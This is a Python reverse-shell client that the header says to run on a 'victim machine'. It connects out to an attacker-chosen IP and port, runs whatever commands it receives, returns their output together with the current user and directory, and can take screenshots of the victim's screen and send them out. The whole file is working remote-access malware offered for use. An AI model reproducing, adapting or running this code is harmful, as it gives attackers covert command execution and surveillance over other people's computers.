# Execute this on your victim machine 
import socket,os,argparse,subprocess
from pyautogui import screenshot
from sys import exit
def get_args():
    parser=argparse.ArgumentParser()
    parser.add_argument('-t',help="Specify the ip address you wanna connect to !",dest="target",required=True)
    parser.add_argument('-p',help="Specify the port number to which connect to !",dest="port",default=1337,type=int)
    return parser.parse_args()

def send_screenshot(s,img_count):
    """Function to handle screenshots """
    myscreenshot=screenshot()
    # Saving the screenshot 
    myscreenshot.save(rf'Screenshot{img_count}.png')
    
    screenshot_filename=f'Screenshot{img_count}.png'
    s.send(f"{screenshot_filename}{Separator}{os.getcwd()}{Separator}{subprocess.getoutput('whoami')}".encode())
    with open(screenshot_filename,"rb") as f:
        while True:
            bytes_read=f.read(bufferSize)
    
            if not bytes_read:
                break
            
            s.send(bytes_read)
    os.remove(screenshot_filename)
    img_count+=1
    return ["[+] Screenshot recieved !",img_count]
            
def execute_cmd(s):
    # Remember at first before accepting and recieving connections, it was reciveing host name and whoami , so now we will send those firstly to make the terminal!
    s.send(os.getcwd().encode())
    s.send(subprocess.getoutput('whoami').encode())
    
    img_count=1
    while True:
        # recieving the data and decoding data and striping the whitespaces around the data 
        cmd=s.recv(bufferSize).decode().strip()
        # Spliting the command in a list for changing directory issues 
        cmd_split=cmd.split()
        if cmd.lower()=='screenshot':
            output,img_count=send_screenshot(s,img_count)
            print(output)
            print("fuckyou",img_count)
            s.send(f"{output}{Separator}{os.getcwd()}{Separator}{subprocess.getoutput('whoami')}".encode())
            # if command comes as quit we will break the loop and close connection! 
        elif cmd.lower()=='quit':
            break
            # if command is cd then we will use os module to perform change of directory
        elif cmd_split[0].lower()=='cd':
            try:
                os.chdir(' '.join(cmd_split[1:]))
            except FileNotFoundError as e:
                output=str(e)
            else:
                output=""
                s.send(f"{output}{Separator}{os.getcwd()}{Separator}{subprocess.getoutput('whoami')}".encode())
        else:
            output=subprocess.getoutput(cmd)
            s.send(f"{output}{Separator}{os.getcwd()}{Separator}{subprocess.getoutput('whoami')}".encode())

            # sending the data with some separator in between so that on the server side we could parse data by spliting 
    s.close()
def create_socket(host,port):
    
    try:
    # creating the socket object     
        s=socket.socket()
        # Direct connecting to the host 
        s.connect((host,port))
        
        execute_cmd(s)
    except socket.error as err:
        print(f"[-] Error occured at socket processing, Reason {err}")
if __name__=="__main__":
    arguments=get_args()
    host=arguments.target
    port=arguments.port
    bufferSize=1024*256 # for 128kb messages buffer
    Separator = "<sep>"
    create_socket(host,port)
    
